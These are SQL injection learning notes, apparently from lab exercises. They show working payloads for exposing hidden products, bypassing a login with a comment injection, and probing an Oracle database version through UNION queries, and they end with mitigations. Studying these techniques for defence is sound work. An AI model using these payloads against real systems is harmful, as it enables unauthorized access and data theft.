# SQL Injection (SQLi) – Learning Notes

## 1. SQL Injection in WHERE Clause – Retrieving Hidden Data

### Vulnerability Description

The application dynamically builds SQL queries using user-supplied input without proper validation or parameterized queries. This allows modification of the SQL logic in the `WHERE` clause.

### Original Query

```sql
SELECT * FROM Products
WHERE category = 'Gifts' AND released = 1;
```

- `released = 1` ensures only public products are shown.

### Injection Point

The `category` parameter (search bar or category filter).

### Payloads Used

**Method 1: SQL Comment Injection**
```sql
'--
```

**Method 2: Boolean-Based Injection**
```sql
' OR 1=1--
```

### Resulting Query (Example)

```sql
SELECT * FROM Products
WHERE category = '' OR 1=1--' AND released = 1;
```

### Why This Works

1. `'` closes the original string literal
2. `OR 1=1` always evaluates to `TRUE`
3. `--` comments out the remainder of the query
4. The `released = 1` condition is ignored

### Impact

- Hidden or unreleased products are exposed
- Business logic is bypassed

---

## 2. SQL Injection in Login Functionality – Authentication Bypass

### Vulnerability Description

The login functionality concatenates user input directly into SQL queries, allowing attackers to bypass authentication.

### Original Query

```sql
SELECT * FROM users
WHERE username = 'admin' AND password = 'admin';
```

### Injection Point

The `username` field (login forms usually do not use search bars).

### Payload Used

```sql
admin'--
```

### Resulting Query

```sql
SELECT * FROM users
WHERE username = 'admin'--' AND password = 'admin';
```

### Why This Works

1. `'` closes the username string
2. `--` comments out the password condition
3. Authentication succeeds if the username exists

### Limitations

- A valid username must be known or guessed
- Does not work well if usernames are unpredictable

---

## 3. SQL Injection – Identifying Oracle Database Type and Version

A SQL injection vulnerability exists in the `Category` parameter, but it is not directly accessible through the UI.

### Tools Used

- **mitmproxy** to intercept and modify HTTP requests
- **Alternatives:** Burp Suite, OWASP ZAP

### Step 1: Intercept the Request

- Used a proxy tool to capture the request containing the `category` parameter
- Modified the request directly in the proxy

### Step 2: Determine the Number of Columns

Used `ORDER BY` to identify the column count:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

The highest number that does not cause an error indicates the number of columns.

### Step 3: Confirm UNION Injection

```sql
' UNION SELECT NULL, NULL, NULL FROM dual--
```

- `dual` is an Oracle-specific table
- Matching the correct number of columns is required

### Step 4: Identify Database Version (Oracle)

```sql
' UNION SELECT banner, NULL, NULL FROM v$version--
```

If column positions differ, swap the column placement:

```sql
' UNION SELECT NULL, banner, NULL FROM v$version--
```

### Why This Works

- Oracle exposes database metadata through `v$version`
- UNION-based SQLi allows retrieval of database information

---

## Key Takeaways

- SQL injection occurs when user input is directly concatenated into SQL queries
- Commenting (`--`) and boolean logic (`OR 1=1`) can alter query behavior
- UNION-based SQLi requires matching column count and data types
- Proxy tools are essential when injection points are not visible in the UI

---

## Mitigations

### Recommended Security Practices

1. **Use Prepared Statements / Parameterized Queries**
   - The most effective defense against SQL injection
   - Separates SQL code from user data

2. **Avoid Dynamic SQL String Concatenation**
   - Never build queries by concatenating strings with user input

3. **Implement Input Validation**
   - Whitelist acceptable input patterns
   - Sanitize and validate all user-supplied data

4. **Use Least-Privilege Database Access**
   - Database accounts should have minimal necessary permissions
   - Separate accounts for different application functions

5. **Use ORMs (Object-Relational Mapping) Where Possible**
   - ORMs often provide built-in protections against SQL injection

6. **Web Application Firewalls (WAF)**
   - Can detect and block common SQL injection attempts

---

## Summary

This exercise demonstrates how SQL injection can:

- ✅ Expose hidden data
- ✅ Bypass authentication mechanisms
- ✅ Reveal database type and version information

**Warning:** These techniques should only be used for authorized security testing and educational purposes. Unauthorized access to computer systems is illegal.

---
